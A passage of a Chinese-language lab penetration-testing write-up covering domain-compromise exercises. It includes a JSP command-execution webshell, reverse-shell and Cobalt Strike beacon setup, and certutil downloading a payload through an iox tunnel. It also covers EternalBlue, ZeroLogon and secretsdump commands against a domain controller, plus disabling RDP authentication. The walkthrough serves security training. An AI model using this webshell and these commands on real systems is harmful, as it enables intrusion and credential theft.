+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,*/*<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">376</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="o">(</span><span class="s2">&#34;023&#34;</span>.equals<span class="o">(</span>request.getParameter<span class="o">(</span><span class="s2">&#34;pwd&#34;</span><span class="o">))){</span>
+</span></span><span class="line"><span class="cl">        java.io.InputStream <span class="nv">in</span> <span class="o">=</span> Runtime.getRuntime<span class="o">()</span>.exec<span class="o">(</span>request.getParameter<span class="o">(</span><span class="s2">&#34;i&#34;</span><span class="o">))</span>.getInputStream<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        int <span class="nv">a</span> <span class="o">=</span> -1<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        byte<span class="o">[]</span> <span class="nv">b</span> <span class="o">=</span> new byte<span class="o">[</span>2048<span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        out.print<span class="o">(</span><span class="s2">&#34;&lt;pre&gt;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="o">((</span><span class="nv">a</span><span class="o">=</span>in.read<span class="o">(</span>b<span class="o">))</span>!<span class="o">=</span>-1<span class="o">){</span>
+</span></span><span class="line"><span class="cl">            out.println<span class="o">(</span>new String<span class="o">(</span>b<span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        out.print<span class="o">(</span><span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">%&gt;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250306113558534.png" alt="image-20250306113558534" loading="lazy"></figure>
+</p>
+<p>访问 JSP 一句话木马，命令执行成功</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://192.168.10.20:8080/1.jsp?pwd=023&amp;i=whoami</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250306112555703.png" alt="image-20250306112555703" loading="lazy"></figure>
+</p>
+<p>Powershell + Base64 反弹，使用浏览器发送时注意对 Payload 进行 URL 编码</p>
+<p><figure>
+  <img src="image-20250306123915074.png" alt="image-20250306123915074" loading="lazy"></figure>
+</p>
+<p>成功接收到反弹 Shell</p>
+<p><figure>
+  <img src="image-20250306123923527.png" alt="image-20250306123923527" loading="lazy"></figure>
+</p>
+<p>拿到第二个旗帜</p>
+<p><figure>
+  <img src="image-20250306195005976.png" alt="image-20250306195005976" loading="lazy"></figure>
+</p>
+<p><strong>权限提升</strong></p>
+<p>上线CS</p>
+<p><figure>
+  <img src="image-20250306172133812.png" alt="image-20250306172133812" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250306172640657.png" alt="image-20250306172640657" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">whoami /priv</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>查询特权，发现 SeImpersonatePrivilege 启用</p>
+<p><figure>
+  <img src="image-20250306193413001.png" alt="image-20250306193413001" loading="lazy"></figure>
+</p>
+<p>尝试使用经典烂土豆提权，成功接收到 System 权限级 Beacon</p>
+<p><figure>
+  <img src="image-20250306200807684.png" alt="image-20250306200807684" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250306201735177.png" alt="image-20250306201735177" loading="lazy"></figure>
+</p>
+<p><strong>远程桌面连接</strong></p>
+<p>开启 3389 后连接报错，是身份证验证错误，直接禁用掉</p>
+<p><figure>
+  <img src="image-20250306204251884.png" alt="image-20250306204251884" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250306204321161.png" alt="image-20250306204321161" loading="lazy"></figure>
+</p>
+<p>连接成功</p>
+<p><figure>
+  <img src="image-20250306204627793.png" alt="image-20250306204627793" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="域渗透-1"><span>域渗透</span>
+  <a href="#%e5%9f%9f%e6%b8%97%e9%80%8f-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>信息收集</strong></p>
+<p>继续对当前主机进行信息收集</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">wmic computersystem get domainrole</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>返回数值为3，当前是一台域成员服务器</p>
+<p><figure>
+  <img src="image-20250306201754808.png" alt="image-20250306201754808" loading="lazy"></figure>
+</p>
+<p>本地管理员组中含有 Domain Admins，该信息也在域全局组中，再次确认系统为域成员服务器</p>
+<p><figure>
+  <img src="image-20250306203710380.png" alt="image-20250306203710380" loading="lazy"></figure>
+</p>
+<p>发现这是一台双网卡主机，还有一个 20.* 网段</p>
+<p><figure>
+  <img src="image-20250306202043364.png" alt="image-20250306202043364" loading="lazy"></figure>
+</p>
+<p>fscan 扫描，发现域控服务器 192.168.20.30 且存在永恒之蓝漏洞</p>
+<p><figure>
+  <img src="image-20250306210846820.png" alt="image-20250306210846820" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="域控---1921682030-1"><span>域控 - 192.168.20.30</span>
+  <a href="#%e5%9f%9f%e6%8e%a7---1921682030-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>msf 打永恒之蓝，通过 admin/smb/ms17_010_command 模块执行成功，拿到 flag</p>
+<p><figure>
+  <img src="image-20250307173614525.png" alt="image-20250307173614525" loading="lazy"></figure>
+</p>
+<p>修改管理员密码，打开 3389 端口，拿下远程桌面</p>
+<p><figure>
+  <img src="image-20250307174645182.png" alt="image-20250307174645182" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="代理转发上线-cs"><span>代理转发上线 CS</span>
+  <a href="#%e4%bb%a3%e7%90%86%e8%bd%ac%e5%8f%91%e4%b8%8a%e7%ba%bf-cs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>之前直接利用 CS 的永恒之蓝漏洞插件攻击 20.30 失败，而我对上线 CS 又有执念。于是我尝试通过 iox 代理转发，给域控上传文件并上线 CS，因为实际上只需要做一层代理隧道，所以操作并不复杂。</p>
+<p>接下来 20.20 统称域成员主机，20.30 为域控</p>
+<p>首先生成 CS 马，配置为 <code>192.168.20.20:29999</code> 。然后在域成员跳板机开启第一层代理隧道</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">iox.exe proxy -l 1080</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250307221920445.png" alt="image-20250307221920445" loading="lazy"></figure>
+</p>
+<p>proxychains4 配置文件修改，将流量转发至域成员主机，以此连接域控远程桌面</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">socks5 192.168.10.20 1080</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250307221938408.png" alt="image-20250307221938408" loading="lazy"></figure>
+</p>
+<p>然后域成员主机通过 iox 将本地 8888 端口转发至攻击机 28888 端口</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">iox.exe fwd -l 192.168.20.20:8888 -r 172.16.233.2:28888</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250307221909470.png" alt="image-20250307221909470" loading="lazy"></figure>
+</p>
+<p>攻击机开启 Web 服务，域控远程桌面下载 CS 马</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">certutil -urlcache -split -f http://192.168.20.20:8888/artifact.exe</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>接下来域成员主机通过 iox 将本地 29999 端口转发至攻击机 29999 端口</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">iox.exe fwd -l 29999 -r 172.16.233.2:29999</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>最后域控执行 CS 马，上线成功</p>
+<p><figure>
+  <img src="image-20250307222607945.png" alt="image-20250307222607945" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="lab3"><span>Lab3</span>
+  <a href="#lab3" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><strong>难度:</strong> <strong>简单</strong></p>
+<p>目标：在192.168.10.0/24网段发现了不得了的秘密。</p>
+<p><strong>信息收集</strong></p>
+<p>探测存活主机、端口扫描、服务探测等，扫描全端口，发现 3590 端口开放了 Web 服务</p>
+<p><figure>
+  <img src="image-20250308122617851.png" alt="image-20250308122617851" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250308165404764.png" alt="image-20250308165404764" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="边界机---1921681010"><span>边界机 - 192.168.10.10</span>
+  <a href="#%e8%be%b9%e7%95%8c%e6%9c%ba---1921681010" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>SQL 注入</strong></p>
+<p>目录扫描，发现后台管理员页面</p>
+<p><figure>
+  <img src="image-20250308124211025.png" alt="image-20250308124211025" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250308124342546.png" alt="image-20250308124342546" loading="lazy"></figure>
+</p>
+<p>通过 taoCMS 默认账户密码登录后台</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">admin/tao</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250308124332636.png" alt="image-20250308124332636" loading="lazy"></figure>
+</p>
+<p>尝试数据管理 - 执行 SQL 模块</p>
+<p><figure>
+  <img src="image-20250308124637361.png" alt="image-20250308124637361" loading="lazy"></figure>
+</p>
+<p>权限级低，没有任何插入、更新或删除权限，日志包含、文件写入等操作走不通了</p>
+<p><figure>
+  <img src="image-20250308124648502.png" alt="image-20250308124648502" loading="lazy"></figure>
+</p>
+<p>taoCMS 还存在一个 SQL 注入的历史漏洞 CVE-2021-44915，可惜通过 MYSQL 获取 Shell 的条件很苛刻，也只能放弃</p>
+<p><figure>
+  <img src="image-20250308131916921.png" alt="image-20250308131916921" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250308133536031.png" alt="image-20250308133536031" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="路径遍历--文件上传"><span>路径遍历 &amp;&amp; 文件上传</span>
+  <a href="#%e8%b7%af%e5%be%84%e9%81%8d%e5%8e%86--%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>继续对历史漏洞进行检索，发现一个可利用的历史漏洞 CVE-2022-23880</p>
+<p><figure>
+  <img src="image-20250308125017782.png" alt="image-20250308125017782" loading="lazy"></figure>
+</p>
+<p>../../../ 访问根目录，下载 Flag 文件，拿到第一个旗帜</p>
+<p><figure>
+  <img src="image-20250308125433242.png" alt="image-20250308125433242" loading="lazy"></figure>
+</p>
+<p>编辑文件，写入一句话木马，保存</p>
+<p><figure>
+  <img src="image-20250308130114153.png" alt="image-20250308130114153" loading="lazy"></figure>
+</p>
+<p>网站根目录就在当前路径，访问指定文件即可</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://192.168.10.10:3590/api.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>目标是 Windows 系统，上传木马并上线 CS</p>
+<p><figure>
+  <img src="image-20250308160819810.png" alt="image-20250308160819810" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="域渗透-2"><span>域渗透</span>
+  <a href="#%e5%9f%9f%e6%b8%97%e9%80%8f-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>内网信息收集</strong></p>
+<p>发现内网另一个网段 192.168.20.10，lab1-7 的网络配置都一样。。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">arp -a</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250308161140192.png" alt="image-20250308161140192" loading="lazy"></figure>
+</p>
+<p>使用 fscan 对 20 段进行扫描</p>
+<p><figure>
+  <img src="image-20250308161343052.png" alt="image-20250308161343052" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="域成员---1921682020-1"><span>域成员 - 192.168.20.20</span>
+  <a href="#%e5%9f%9f%e6%88%90%e5%91%98---1921682020-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这台域成员机器甚至不需要进行漏洞利用，官方已经做了提示</p>
+<p><figure>
+  <img src="image-20250308165541499.png" alt="image-20250308165541499" loading="lazy"></figure>
+</p>
+<p>端口及服务探测，发现 8055 端口搭建了 Web 服务</p>
+<p><figure>
+  <img src="image-20250308163615065.png" alt="image-20250308163615065" loading="lazy"></figure>
+</p>
+<p>搭建内网隧道访问，发现对方用的是 ThinkPHP v5.0</p>
+<p><figure>
+  <img src="image-20250308165333805.png" alt="image-20250308165333805" loading="lazy"></figure>
+</p>
+<p>找了半天也没发现有什么明显遗留的木马文件</p>
+<p><figure>
+  <img src="image-20250308165507675.png" alt="image-20250308165507675" loading="lazy"></figure>
+</p>
+<p>只有找到两个 php 文件，index.php 和 router.php，使用一句话木马爆破脚本爆破一下</p>
+<p><figure>
+  <img src="image-20250308171158855.png" alt="image-20250308171158855" loading="lazy"></figure>
+</p>
+<p>访问拿到 第二个旗帜</p>
+<p><figure>
+  <img src="image-20250308171941408.png" alt="image-20250308171941408" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250308171903895.png" alt="image-20250308171903895" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250308174126831.png" alt="image-20250308174126831" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="域控---1921682030-2"><span>域控 - 192.168.20.30</span>
+  <a href="#%e5%9f%9f%e6%8e%a7---1921682030-2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>ZeroLogon</strong></p>
+<p><figure>
+  <img src="image-20250308164230697.png" alt="image-20250308164230697" loading="lazy"></figure>
+</p>
+<p>使用 ZeroLogon 漏洞置空域控主机 hash</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">python cve-2020-1472-exploit.py WIN-7NRTJO59O7N 192.168.20.30 </span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250309160806228.png" alt="image-20250309160806228" loading="lazy"></figure>
+</p>
+<p>然后拿下域控制器 hash</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">python secretsdump.py &#39;CSLab.com/WIN-7NRTJO59O7N$@192.168.20.30&#39; -no-pass</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250309164917519.png" alt="image-20250309164917519" loading="lazy"></figure>
+</p>
+<p>远程命令执行 ，拿到最后的旗帜</p>
